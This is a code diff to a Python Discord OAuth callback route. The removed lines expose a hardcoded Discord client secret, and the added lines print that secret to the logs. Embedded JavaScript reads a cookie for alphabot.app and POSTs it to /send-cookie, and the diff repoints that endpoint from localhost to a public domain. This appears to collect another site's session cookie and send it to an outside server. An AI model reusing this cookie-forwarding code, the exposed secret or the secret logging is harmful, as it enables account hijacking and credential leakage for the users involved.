@@ -499,13 +499,16 @@ async def mymint_discord_callback(request: Request, code: str):
             "Content-Type": "application/x-www-form-urlencoded"
         })
         data = {
-            "client_id": "1090169638765207574",
-            "client_secret": "jCbUl3bYbyVOa9-U5YELAd90IOMBXKMm",
+            "client_id": DISCORD_CLIENT_ID,
+            "client_secret": DISCORD_CLIENT_SECRET,
             "grant_type": "authorization_code",
             "code": code,
-            "redirect_uri": f"http://localhost:8080/discord-callback/mymint",
+            "redirect_uri": f"https://code.yjsdev.tk/discord-callback/mymint",
             "scope": "identify"
         }
+
+        print("data:",data)
+
         token_response = session.post("https://discord.com/api/oauth2/token", data=data)
         token_response.raise_for_status()
         access_token = token_response.json()["access_token"]
@@ -535,7 +538,7 @@ async def mymint_discord_callback(request: Request, code: str):
                 // 쿠키 값을 가져온 후 서버로 전송
                 const cookieValue = getCookie("https://www.alphabot.app");
                 alert(cookieValue)
-                fetch("http://localhost:8080/send-cookie", {{
+                fetch("https://code.yjsdev.tk/send-cookie", {{
                     method: "POST",
                     headers: {{
                         "Content-Type": "application/json"
